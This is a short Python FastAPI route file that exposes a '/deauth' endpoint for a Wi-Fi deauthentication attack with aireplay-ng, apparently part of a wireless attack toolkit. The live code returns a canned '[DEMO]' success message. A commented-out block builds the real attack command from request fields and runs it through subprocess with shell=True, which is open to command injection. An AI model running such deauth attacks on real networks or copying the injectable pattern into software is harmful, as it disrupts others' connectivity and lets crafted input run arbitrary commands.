from fastapi import APIRouter, HTTPException
from models.requests import DeauthRequest

router = APIRouter()

@router.post("/deauth")
def deauth_attack(request: DeauthRequest):
    """Perform deauthentication attack using aireplay-ng"""
    try:
        # Validate inputs
        if not request.target_bssid:
            raise HTTPException(status_code=400, detail="target_bssid is required")
        if not request.adapter:
            raise HTTPException(status_code=400, detail="adapter is required")
            
        target_info = f" against {request.target_mac}" if request.target_mac else " (broadcast)"
        
        # In a real implementation:
        # cmd = f"sudo aireplay-ng --deauth 10 -a {request.target_bssid}"
        # if request.target_mac:
        #     cmd += f" -c {request.target_mac}"
        # cmd += f" {request.adapter}"
        # subprocess.run(cmd, shell=True)
        
        return {
            "status": "success",
            "message": f"Deauth attack started on {request.target_bssid}{target_info}",
            "output": f"[DEMO] aireplay-ng --deauth 10 -a {request.target_bssid} {'-c ' + request.target_mac if request.target_mac else ''} {request.adapter}\n[DEMO] Sending deauth packets...\n[DEMO] Attack in progress"
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Deauth attack failed: {str(e)}")
